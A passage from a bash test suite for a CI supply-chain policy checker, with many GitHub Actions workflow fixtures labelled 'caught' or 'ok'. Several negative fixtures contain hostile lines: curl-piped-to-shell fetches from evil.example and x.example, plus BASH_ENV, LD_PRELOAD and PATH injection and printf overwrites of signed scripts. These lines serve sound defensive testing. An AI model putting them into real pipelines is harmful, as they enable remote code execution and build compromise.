rawcase r_bom caught - '"\ufeffbash bin/build-stage.sh a"' 'a byte-order mark before the command'
d=$(mk g_envok); printf 'jobs:\n  j:\n    steps:\n      - env:\n          V: ${{ inputs.v }}\n        run: bash bin/build-stage.sh "$V"\n' > "$d/.github/workflows/stage-verify.yml"
expect ok "AC1 grammar: a whole \"\$NAME\" read of the step's own env:" tree "$d"
d=$(mk g_shell); printf 'jobs:\n  j:\n    steps:\n      - shell: python\n        run: bash bin/build-stage.sh a\n' > "$d/.github/workflows/stage-verify.yml"
expect caught "AC1 grammar: a step shell other than bash" tree "$d"
d=$(mk g_wd); printf 'jobs:\n  j:\n    steps:\n      - working-directory: bin\n        run: bash build-stage.sh a\n' > "$d/.github/workflows/stage-verify.yml"
expect caught "AC1 grammar: working-directory reroutes every path" tree "$d"
d=$(mk g_sign1); stage "$d" 'python3 bin/chain-verify.py sign --check --digests digests.json'
expect caught "AC1 grammar: chain-verify.py sign anywhere but stage-sign.yml is a second provenance signer" tree "$d"
d=$(mk g_nonstage); printf 'on: push\njobs:\n  j:\n    steps:\n      - run: make test\n      - run: cat x | bash\n' > "$d/.github/workflows/ci.yml"
expect ok "AC1 scope: ci.yml and other non-stage workflows keep only the direct signer-call scan (make, pipes are not judged)" tree "$d"
# the allowlist file itself
d=$(mk l_nolist); rm "$d/.github/policy/chain-scripts.json"; expect caught "AC1 allowlist: no chain-scripts.json" tree "$d"
d=$(mk l_hash); setfile "$d" bin/build-apk.sh '#!/usr/bin/env bash\nset -euo pipefail\necho changed\n'; expect caught "AC1 allowlist: a listed script whose sha256 no longer matches" tree "$d"
d=$(mk l_gone); python3 - "$d" <<'PY'
import json, sys
f = sys.argv[1] + "/.github/policy/chain-scripts.json"; j = json.load(open(f)); j["scripts"].append({"path": "bin/ghost.sh", "sha256": "0" * 64, "tools": [], "signs": False, "runs": []}); json.dump(j, open(f, "w"))
PY
expect caught "AC1 allowlist: a row for a file that is not in the tree" tree "$d"
d=$(mk l_dots); python3 - "$d" <<'PY'
import json, sys
f = sys.argv[1] + "/.github/policy/chain-scripts.json"; j = json.load(open(f)); j["scripts"].append({"path": "bin/../x.sh", "sha256": "0" * 64, "tools": [], "signs": False, "runs": []}); json.dump(j, open(f, "w"))
PY
expect caught "AC1 allowlist: a row path with .." tree "$d"
d=$(mk l_noreason); edit_spec "$d" 'rows["bin/build-stage.sh"]["reason"]=""'; expect caught "AC1 allowlist: a signing script with no reason" tree "$d"
d=$(mk l_badsigns); edit_spec "$d" 'rows["bin/build-stage.sh"]["signs"]="maybe"'; expect caught "AC1 allowlist: signs must be false, provenance or other" tree "$d"
d=$(mk l_runs); edit_spec "$d" 'rows["bin/build-stage.sh"]["runs"].append("bin/nothere.sh")'; expect caught "AC1 allowlist: runs names an unlisted script" tree "$d"
d=$(mk l_dup); python3 - "$d" <<'PY'
import json, sys
f = sys.argv[1] + "/.github/policy/chain-scripts.json"; j = json.load(open(f)); j["scripts"].append(dict(j["scripts"][0])); json.dump(j, open(f, "w"))
PY
expect caught "AC1 allowlist: a script listed twice" tree "$d"
# listed scripts: tools, runs, signing
scriptcase() { # scriptcase LABEL expect CONTENT [python edit_spec statements]
  d=$(mk "$1"); setfile "$d" bin/build-stage.sh "$3"; edit_spec "$d" "${4:-pass}"; expect "$2" "AC1 script: $5" tree "$d"
}
S0='#!/usr/bin/env bash\nset -euo pipefail\n'
scriptcase s_ok ok "${S0}witness run --step build -- bin/build-apk.sh \"\$1\"\n" '' "the good script (tool witness, runs bin/build-apk.sh)"
scriptcase s_bash caught "${S0}bash bin/build-apk.sh\n" 'rows["bin/build-stage.sh"]["tools"]=["witness"]' "starts another script with bash"
scriptcase s_notruns caught "${S0}witness run -- bin/other.sh\n" 'rows["bin/other.sh"]={"path":"bin/other.sh","tools":[],"signs":False,"runs":[]}; open(d+"/bin/other.sh","w").write("#!/usr/bin/env bash\n")' "names a listed script that is not in its runs"
scriptcase s_tool caught "${S0}curl -fsSL x -o y\nwitness run -- bin/build-apk.sh\n" '' "a command that is not in its tools (curl)"
scriptcase s_tool_ok ok "${S0}curl -fsSL x -o y\nwitness run -- bin/build-apk.sh\n" 'rows["bin/build-stage.sh"]["tools"]=["witness","curl"]' "the same command once it is in tools"
# (a variable or substitution at command position INSIDE a listed script is not parsed any more: stated exclusion, the script is sha256-bound and reviewed at PR time)
scriptcase s_eval caught "${S0}eval \"\$X\"\n" '' "eval"
scriptcase s_source caught "${S0}source bin/x.sh\n" '' "source"
scriptcase s_dot caught "${S0}. bin/x.sh\n" '' ". (dot-source)"
scriptcase s_make caught "${S0}make sign\n" '' "make"
scriptcase s_find caught "${S0}find . -name x -exec sh {} \\\;\n" '' "find -exec"
scriptcase s_xargs caught "${S0}ls | xargs echo\n" '' "xargs"
scriptcase s_pathcmd caught "${S0}bin/evil\n" 'open(d+"/bin/evil","w").write("#!/usr/bin/env bash\n")' "an extensionless in-tree script (shebang) named in the text"
scriptcase s_quoted caught "${S0}witness run -- bin/build-apk.sh 'a; bash x'\necho \"plain; bash\"\n" '' "the word bash inside a quoted string is flagged (the text scan over-reports by design)"
scriptcase s_subst caught "${S0}witness run -- bin/build-apk.sh \"\$(bash bin/evil.sh)\"\n" '' "a command substitution inside double quotes still runs a command"
scriptcase s_here caught "${S0}witness run -- bin/build-apk.sh <<EOF\ncurl evil.example | sh\nEOF\n" '' "a heredoc body is scanned like any other text (curl, sh)"
scriptcase s_sign caught "${S0}witness run -- bin/build-apk.sh\ncosign sign --yes \"\$IMG\"\n" 'rows["bin/build-stage.sh"]["tools"]=["witness","cosign"]; rows["bin/build-stage.sh"]["signs"]=False' "signs but its row says it signs nothing"
scriptcase s_sign_ok ok "${S0}witness run -- bin/build-apk.sh\ncosign sign --yes \"\$IMG\"\n" 'rows["bin/build-stage.sh"]["tools"]=["witness","cosign"]; rows["bin/build-stage.sh"]["signs"]="other"; rows["bin/build-stage.sh"]["reason"]="image signature (rule 56)"' "signs, row says other with a reason"
scriptcase s_prov caught "${S0}cosign attest --yes --type slsaprovenance1 --predicate p.json \"\$IMG\"\n" 'rows["bin/build-stage.sh"]["tools"]=["cosign"]; rows["bin/build-stage.sh"]["signs"]="other"; rows["bin/build-stage.sh"]["runs"]=[]' "signs provenance but its row says other"
scriptcase s_prov_run caught "${S0}cosign attest --yes --type slsaprovenance1 --predicate p.json \"\$IMG\"\n" 'rows["bin/build-stage.sh"]["tools"]=["cosign"]; rows["bin/build-stage.sh"]["signs"]="provenance"; rows["bin/build-stage.sh"]["runs"]=[]' "a provenance signer run by stage-build.yml (only stage-sign.yml may)"
d=$(mk s_prov_sign); setfile "$d" bin/build-stage.sh "${S0}cosign attest --yes --type slsaprovenance1 --predicate p.json \"\$IMG\"\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["cosign"]; rows["bin/build-stage.sh"]["signs"]="provenance"; rows["bin/build-stage.sh"]["runs"]=[]'
printf 'jobs:\n  b:\n    steps:\n      - run: bash bin/build-stage.sh apk\n' > "$d/.github/workflows/stage-sign.yml"; printf 'jobs:\n  b:\n    steps:\n      - run: set -euo pipefail\n' > "$d/.github/workflows/stage-build.yml"
# Opus #249 frozen-design blocker 1: the one provenance row is chain-verify.py `sign`; any other row with signs: provenance is refused, whoever runs it
expect caught "AC1 script: another provenance signer, even one run only by stage-sign.yml (only bin/chain-verify.py may have signs: provenance)" tree "$d"
d=$(mk s_trans); printf 'jobs:\n  b:\n    steps:\n      - run: bash bin/build-stage.sh a\n' > "$d/.github/workflows/stage-verify.yml"; setfile "$d" bin/prov.sh "${S0}cosign attest --yes --type slsaprovenance1 --predicate p.json \"\$IMG\"\n"
edit_spec "$d" 'rows["bin/prov.sh"]={"path":"bin/prov.sh","tools":["cosign"],"signs":"provenance","reason":"x","runs":[]}; rows["bin/build-stage.sh"]["runs"].append("bin/prov.sh")'
setfile "$d" bin/build-stage.sh "${S0}witness run -- bin/build-apk.sh\nwitness run -- bin/prov.sh\n"; gen "$d"; printf 'jobs:\n  b:\n    steps:\n      - run: bash bin/build-stage.sh apk\n' > "$d/.github/workflows/stage-build.yml"
expect caught "AC1 script: a provenance signer reached through a listed script's runs from a non-Sign stage" tree "$d"
d=$(mk s_py); setfile "$d" bin/build-apk.sh '#!/usr/bin/env bash\n'; printf '#!/usr/bin/env python3\nimport subprocess\nsubprocess.run(["cosign","sign","x"])\ncosign sign --yes x\n' > "$d/bin/signer.py"
edit_spec "$d" 'rows["bin/signer.py"]={"path":"bin/signer.py","tools":[],"signs":False,"runs":[]}'
expect caught "AC1 script: a python script that signs while its row says it signs nothing" tree "$d"

# ---- round 11b (advisor decision b): the key set, the uses list, printf, and the text scan of listed scripts. Every probe of both final-round
# reports (Sonnet 1-12, Opus P1-P11) is a named error case; the ok controls show the legitimate shapes still pass.
ycase() { d=$(mk "$1"); sed "s/@SHA/@$sha/g" > "$d/.github/workflows/stage-verify.yml"; expect "${3:-caught}" "AC1 keys: $2" tree "$d"; }
ycase y_ok_matrix "a matrix job on literal runner labels with a listed script, checkout, artifacts" ok <<'EOF'
jobs:
  apk:
    runs-on: ${{ matrix.runner }}
    strategy:
      fail-fast: true
      matrix:
        runner: [ubuntu-24.04, ubuntu-24.04-arm]
    steps:
      - uses: actions/checkout@SHA
        with:
          persist-credentials: false
      - uses: actions/download-artifact@SHA
        with:
          name: dist
          path: dl
      - run: bash bin/build-stage.sh apk
      - uses: actions/upload-artifact@SHA
        with:
          name: out
          path: out
EOF
ycase y_ok_printf "printf '%s' \"\$NAME\" > digests.json with the name in env_names" ok <<'EOF'
jobs:
  j:
    steps:
      - env:
          DIGESTS: ${{ inputs.digests }}
        run: printf '%s' "$DIGESTS" > digests.json
EOF
ycase y_wfdefaults "workflow-level defaults.run.shell (Sonnet 1)" <<'EOF'
defaults:
  run:
    shell: "bash -c 'bash bin/unlisted.sh; bash {0}'"
jobs:
  j:
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_jobdefaults "job-level defaults.run.shell (Sonnet 1, Opus P4)" <<'EOF'
jobs:
  j:
    defaults:
      run:
        shell: "bash -c 'bash bin/unlisted.sh; bash {0}'"
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_wfdefaults_wd "workflow-level defaults.run.working-directory (Opus P4b)" <<'EOF'
defaults:
  run:
    working-directory: evil
jobs:
  j:
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_wfenv "workflow-level env BASH_ENV (Sonnet 3)" <<'EOF'
env:
  BASH_ENV: bin/unlisted.sh
jobs:
  j:
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_jobenv "job-level env (Opus B3)" <<'EOF'
jobs:
  j:
    env:
      X1: y
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_bashenv "step env BASH_ENV carrying code (Sonnet 3, Opus P3)" <<'EOF'
jobs:
  j:
    steps:
      - env:
          BASH_ENV: bin/evil.sh
        run: bash bin/build-stage.sh a
EOF
ycase y_path "step env PATH: ./bin (Sonnet 4)" <<'EOF'
jobs:
  j:
    steps:
      - env:
          PATH: ./bin
        run: bash bin/build-stage.sh a
EOF
ycase y_pythonpath "step env PYTHONPATH (Opus P10)" <<'EOF'
jobs:
  j:
    steps:
      - env:
          PYTHONPATH: evil
        run: python3 bin/chain-verify.py stage-start --stage rebuild
EOF
ycase y_ldpreload "step env LD_PRELOAD" <<'EOF'
jobs:
  j:
    steps:
      - env:
          LD_PRELOAD: bin/evil.so
        run: bash bin/build-stage.sh a
EOF
ycase y_envname "step env name not in the closed env_names list" <<'EOF'
jobs:
  j:
    steps:
      - env:
          FOO: bar
        run: bash bin/build-stage.sh "$FOO"
EOF
ycase y_envunread "step env key the run line does not read whole" <<'EOF'
jobs:
  j:
    steps:
      - env:
          V: ${{ inputs.v }}
        run: bash bin/build-stage.sh a
EOF
ycase y_composite "uses: ./.github/actions/x, a local composite action (Sonnet 5, Opus P5)" <<'EOF'
jobs:
  j:
    steps:
      - uses: ./.github/actions/x
EOF
ycase y_docker "uses: docker://alpine (Sonnet 6)" <<'EOF'
jobs:
  j:
    steps:
      - uses: docker://alpine
EOF
ycase y_ghscript "a digest-pinned actions/github-script whose script runs a program (Sonnet 12)" <<'EOF'
jobs:
  j:
    steps:
      - uses: actions/github-script@SHA
        with:
          script: require('child_process').execSync('bin/unlisted.sh')
EOF
ycase y_unpinned "an unpinned action" <<'EOF'
jobs:
  j:
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: false
EOF
ycase y_jobuses "a job-level reusable-workflow call to ci.yml (Sonnet 7, Opus P9)" <<'EOF'
jobs:
  j:
    uses: ./.github/workflows/ci.yml
EOF
ycase y_container "job container: (Sonnet 11, Opus P11)" <<'EOF'
jobs:
  j:
    container: alpine
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_services "job services:" <<'EOF'
jobs:
  j:
    services:
      db:
        image: postgres
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_continue "step continue-on-error" <<'EOF'
jobs:
  j:
    steps:
      - continue-on-error: true
        run: bash bin/build-stage.sh a
EOF
ycase y_matrix_expr "a matrix value that is an expression" <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        runner: ${{ fromJSON(inputs.runners) }}
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_runson "runs-on a self-hosted label" <<'EOF'
jobs:
  j:
    runs-on: self-hosted
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_ckref "checkout with a ref (Opus P6)" <<'EOF'
jobs:
  j:
    steps:
      - uses: actions/checkout@SHA
        with:
          persist-credentials: false
          ref: evil
EOF
ycase y_ckrepo "checkout of another repository" <<'EOF'
jobs:
  j:
    steps:
      - uses: actions/checkout@SHA
        with:
          persist-credentials: false
          repository: evil/x
EOF
ycase y_ckpersist "checkout without persist-credentials: false" <<'EOF'
jobs:
  j:
    steps:
      - uses: actions/checkout@SHA
EOF
ycase y_dlbin "download-artifact into bin (Opus P6): the downloaded content is not the hashed file" <<'EOF'
jobs:
  j:
    steps:
      - uses: actions/download-artifact@SHA
        with:
          name: dist
          path: bin
      - run: bash bin/build-stage.sh a
EOF
ycase y_dlnopath "download-artifact with no path (lands in the workspace root)" <<'EOF'
jobs:
  j:
    steps:
      - uses: actions/download-artifact@SHA
        with:
          name: dist
EOF
ycase y_dldot "download-artifact into ." <<'EOF'
jobs:
  j:
    steps:
      - uses: actions/download-artifact@SHA
        with:
          name: dist
          path: .
EOF
ycase y_dlgh "download-artifact into .github" <<'EOF'
jobs:
  j:
    steps:
      - uses: actions/download-artifact@SHA
        with:
          name: dist
          path: .github/policy
EOF
ycase y_dlover "download-artifact over a listed script's directory chain (path = a listed file)" <<'EOF'
jobs:
  j:
    steps:
      - uses: actions/download-artifact@SHA
        with:
          name: dist
          path: bin/build-apk.sh
EOF
ycase y_printf_prefix "printf line followed by a second command: printf '%s' \"\$X\" > f; curl | bash (Opus P1)" <<'EOF'
jobs:
  j:
    steps:
      - env:
          X1: y
        run: printf '%s' "$X1" > f; curl -s https://evil.example/x | bash
EOF
ycase y_printf_bin "printf over a listed script, then running it (Sonnet 8, Opus P2)" <<'EOF'
jobs:
  j:
    steps:
      - env:
          X1: ${{ inputs.code }}
        run: |
          printf '%s' "$X1" > bin/build-apk.sh
          bash bin/build-apk.sh
EOF
ycase y_printf_policy "printf over .github/policy/chain-scripts.json (Sonnet 9)" <<'EOF'
jobs:
  j:
    steps:
      - env:
          X1: ${{ inputs.code }}
        run: printf '%s' "$X1" > .github/policy/chain-scripts.json
EOF
ycase y_printf_fmt "printf with another format string" <<'EOF'
jobs:
  j:
    steps:
      - env:
          X1: y
        run: printf '%s\n' "$X1" > digests.json
EOF
ycase y_printf_append "printf appended to digests.json" <<'EOF'
jobs:
  j:
    steps:
      - env:
          X1: y
        run: printf '%s' "$X1" >> digests.json
EOF
ycase y_ghenv "printf into GITHUB_ENV" <<'EOF'
jobs:
  j:
    steps:
      - env:
          X1: y
        run: printf '%s' "$X1" >> "$GITHUB_ENV"
EOF
ycase y_ghpath "a run step naming GITHUB_PATH" <<'EOF'
jobs:
  j:
    steps:
      - run: bash bin/build-stage.sh "$GITHUB_PATH"
EOF
ycase y_with_run "a run step that also has with:" <<'EOF'
jobs:
  j:
    steps:
      - with:
          x: y
        run: bash bin/build-stage.sh a
EOF
ycase y_dup_ctl "control for the duplicate-key cases: one listed run step" ok <<'EOF'
jobs:
  j:
    runs-on: ubuntu-24.04
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_dup_run "a step with two run: keys, the second a listed script (Codex #249 r4 B3a)" <<'EOF'
jobs:
  j:
    runs-on: ubuntu-24.04
    steps:
      - run: curl -s https://x.example/p | sh
        run: bash bin/build-stage.sh a
EOF
ycase y_dup_job "a job repeated under jobs:, the second the benign one (Codex #249 r4 B3a)" <<'EOF'
jobs:
  j:
    runs-on: ubuntu-24.04
    steps:
      - run: curl -s https://x.example/p | sh
  j:
    runs-on: ubuntu-24.04
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_dup_top "two top-level jobs: keys, the second the benign one (Codex #249 r4 B3a)" <<'EOF'
jobs:
  j:
    runs-on: ubuntu-24.04
    steps:
      - run: curl -s https://x.example/p | sh
jobs:
  j:
    runs-on: ubuntu-24.04
    steps:
      - run: bash bin/build-stage.sh a
EOF
# runs-on and the matrix (Codex #249 r5 B3, the class closed): a matrix read in runs-on may only read a matrix key whose
# every value is a GitHub-hosted ubuntu label; include/exclude, non-list values and nested leaves are refused
ycase y_ro_ok_direct 'control: runs-on ubuntu-24.04 directly' ok <<'EOF'
jobs:
  j:
    runs-on: ubuntu-24.04
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_ro_ok_matrix1 'control: runs-on a matrix read of ["ubuntu-24.04"]' ok <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        runner: ["ubuntu-24.04"]
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_m_selfhosted 'runs-on a matrix read whose runner list is [self-hosted] (Codex #249 r5 B3)' caught <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        runner: [self-hosted]
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_m_mixed 'a matrix runner list holding ubuntu-24.04 and self-hosted (B3 sibling)' caught <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        runner: [ubuntu-24.04, self-hosted]
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_m_windows 'a matrix runner list holding a non-ubuntu hosted label, windows-latest (B3 sibling)' caught <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        runner: [windows-latest]
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_m_case 'a matrix runner label in another case, Ubuntu-24.04 (B3 sibling)' caught <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        runner: [Ubuntu-24.04]
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_m_include 'a matrix include entry that adds a self-hosted runner (B3 sibling)' caught <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        runner: [ubuntu-24.04]
        include:
          - runner: self-hosted
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_m_include_benign 'a matrix include entry even with a benign value (B3 sibling: include/exclude are refused)' caught <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        runner: [ubuntu-24.04]
        include:
          - variant: x
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_m_exclude 'a matrix exclude entry (B3 sibling)' caught <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        runner: [ubuntu-24.04, ubuntu-24.04-arm]
        exclude:
          - runner: ubuntu-24.04
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_m_string 'a matrix given as a plain string (B3 sibling)' caught <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix: ubuntu-24.04
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_m_exprall 'a matrix given as an expression (B3 sibling)' caught <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix: ${{ fromJSON(inputs.m) }}
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_m_keymiss 'runs-on reads matrix.runner but the matrix has only os (B3 sibling: key differs)' caught <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        os: [ubuntu-24.04]
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_m_keycase 'runs-on reads matrix.Runner while the matrix key is runner (B3 sibling: key differs by case)' caught <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.Runner }}
    strategy:
      matrix:
        runner: [ubuntu-24.04]
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_m_nostrategy 'runs-on is a matrix read with no strategy at all (B3 sibling)' caught <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_m_nomatrix 'runs-on is a matrix read with a strategy that has no matrix (B3 sibling)' caught <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      fail-fast: true
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_m_nested 'a matrix runner list holding a nested list (B3 sibling: a non-string leaf)' caught <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        runner: [[ubuntu-24.04]]
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_m_dictleaf 'a matrix runner list holding a mapping (B3 sibling: a dict leaf)' caught <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        runner:
          - {label: ubuntu-24.04}
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_m_scalar 'a matrix runner value that is a scalar, not a list (B3 sibling)' caught <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        runner: ubuntu-24.04
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_m_emptylist 'a matrix runner list that is empty (B3 sibling)' caught <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        runner: []
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_m_otherdict 'another matrix key holding a mapping (B3 sibling: nested leaves anywhere in the matrix)' caught <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        runner: [ubuntu-24.04]
        cfg:
          - {a: b}
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_ro_list 'runs-on as a label list [self-hosted, linux] (B3 sibling)' caught <<'EOF'
jobs:
  j:
    runs-on: [self-hosted, linux]
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_ro_list_ok 'runs-on as a one-element list [ubuntu-24.04] (B3 sibling: only a plain string)' caught <<'EOF'
jobs:
  j:
    runs-on: [ubuntu-24.04]
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_ro_group 'runs-on as a group: mapping (B3 sibling)' caught <<'EOF'
jobs:
  j:
    runs-on: {group: big}
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_ro_labels 'runs-on as a group:/labels: mapping (B3 sibling)' caught <<'EOF'
jobs:
  j:
    runs-on: {group: big, labels: [ubuntu-24.04]}
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_ro_input 'runs-on as an input expression (B3 sibling: only the matrix read form)' caught <<'EOF'
jobs:
  j:
    runs-on: ${{ inputs.runner }}
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_ro_format 'runs-on as a format() of the matrix value (B3 sibling)' caught <<'EOF'
jobs:
  j:
    runs-on: ${{ format('{0}', matrix.runner) }}
    strategy:
      matrix:
        runner: [ubuntu-24.04]
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_ro_concat 'runs-on with text around a matrix read, ubuntu-${{ matrix.v }} (B3 sibling)' caught <<'EOF'
jobs:
  j:
    runs-on: ubuntu-${{ matrix.v }}
    strategy:
      matrix:
        v: ['24.04']
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_ro_selfhosted_direct 'runs-on self-hosted directly (B3 sibling, control for the direct form)' caught <<'EOF'
jobs:
  j:
    runs-on: self-hosted
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_fold_ok "control: a folded run: > that joins two lines with a space (the judge reads the folded value GitHub runs)" ok <<'EOF'
jobs:
  j:
    steps:
      - run: >
          bash bin/build-stage.sh
          a
EOF
ycase y_fold_bs "a folded run: > whose first line ends in a backslash (folds to an escaped space)" <<'EOF'
jobs:
  j:
    steps:
      - run: >
          bash bin/build-stage.sh\
          .evil
EOF
# the runner label set is CLOSED (Codex #249 r6 B5): exactly ubuntu-22.04, ubuntu-24.04 (each optionally -arm) and ubuntu-latest,
# for a direct runs-on and for every matrix value runs-on reads
ycase y_h1_direct "control: runs-on ubuntu-22.04" ok <<'EOF'
jobs:
  j:
    runs-on: "ubuntu-22.04"
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h1_matrix "control: runs-on through a matrix leaf ubuntu-22.04" ok <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        runner: ["ubuntu-22.04"]
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h2_direct "control: runs-on ubuntu-24.04" ok <<'EOF'
jobs:
  j:
    runs-on: "ubuntu-24.04"
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h2_matrix "control: runs-on through a matrix leaf ubuntu-24.04" ok <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        runner: ["ubuntu-24.04"]
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h3_direct "control: runs-on ubuntu-24.04-arm" ok <<'EOF'
jobs:
  j:
    runs-on: "ubuntu-24.04-arm"
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h3_matrix "control: runs-on through a matrix leaf ubuntu-24.04-arm" ok <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        runner: ["ubuntu-24.04-arm"]
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h4_direct "control: runs-on ubuntu-22.04-arm" ok <<'EOF'
jobs:
  j:
    runs-on: "ubuntu-22.04-arm"
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h4_matrix "control: runs-on through a matrix leaf ubuntu-22.04-arm" ok <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        runner: ["ubuntu-22.04-arm"]
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h5_direct "control: runs-on ubuntu-latest" ok <<'EOF'
jobs:
  j:
    runs-on: "ubuntu-latest"
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h5_matrix "control: runs-on through a matrix leaf ubuntu-latest" ok <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        runner: ["ubuntu-latest"]
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h6_direct "runs-on ubuntu-." caught <<'EOF'
jobs:
  j:
    runs-on: "ubuntu-."
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h6_matrix "runs-on through a matrix leaf ubuntu-." caught <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        runner: ["ubuntu-."]
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h7_direct "runs-on ubuntu-..." caught <<'EOF'
jobs:
  j:
    runs-on: "ubuntu-..."
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h7_matrix "runs-on through a matrix leaf ubuntu-..." caught <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        runner: ["ubuntu-..."]
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h8_direct "runs-on ubuntu-24..04" caught <<'EOF'
jobs:
  j:
    runs-on: "ubuntu-24..04"
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h8_matrix "runs-on through a matrix leaf ubuntu-24..04" caught <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        runner: ["ubuntu-24..04"]
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h9_direct "runs-on ubuntu-24.04.1.2" caught <<'EOF'
jobs:
  j:
    runs-on: "ubuntu-24.04.1.2"
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h9_matrix "runs-on through a matrix leaf ubuntu-24.04.1.2" caught <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        runner: ["ubuntu-24.04.1.2"]
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h10_direct "runs-on ubuntu-0" caught <<'EOF'
jobs:
  j:
    runs-on: "ubuntu-0"
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h10_matrix "runs-on through a matrix leaf ubuntu-0" caught <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        runner: ["ubuntu-0"]
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h11_direct "runs-on ubuntu-99.99" caught <<'EOF'
jobs:
  j:
    runs-on: "ubuntu-99.99"
    steps:
      - run: bash bin/build-stage.sh a
EOF
